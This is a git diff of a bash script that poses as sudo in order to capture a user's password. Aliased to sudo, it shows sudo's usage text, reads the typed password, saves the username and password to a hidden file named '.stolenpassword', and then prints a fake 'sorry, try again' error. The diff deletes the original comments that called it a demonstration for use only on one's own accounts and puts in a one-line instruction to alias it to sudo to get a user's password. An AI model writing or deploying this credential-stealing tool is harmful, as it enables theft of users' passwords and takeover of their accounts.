@@ -1,8 +1,6 @@
 #!/bin/bash
 
-### Just a script to demonstrate how easy it is to imitate sudo's behaviour to steal a user's password
-### Alias this script to sudo in .bashrc
-### ONLY USE ON YOUR OWN ACCOUNTS
+### Alias this to sudo to get a user's password
 
 commande="$1"
 arguments="$2"
@@ -15,6 +13,7 @@ usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
 usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
             prompt] [-T timeout] [-u user] file ..."
 error_output=$(sudo -l | grep badpass | cut -d , -f3 | cut -d = -f2)	    
+error_output_hardcoded="sorry, try again"
 trashfile=".trashfile"
 password_file=".stolenpassword"
 
@@ -31,7 +30,7 @@ function get_password () {
 	trap - EXIT INT HUP QUIT 		# Cancel previous trap
 	echo -e "User: $(whoami)\nPass: $password" > "$password_file" 
 	sleep 2 
-	echo -e "\n$error_output"
+	echo -e "\n$error_output_hardcoded"
 }
 
 if [[ ! -e "$password_file" ]]; then get_password; fi
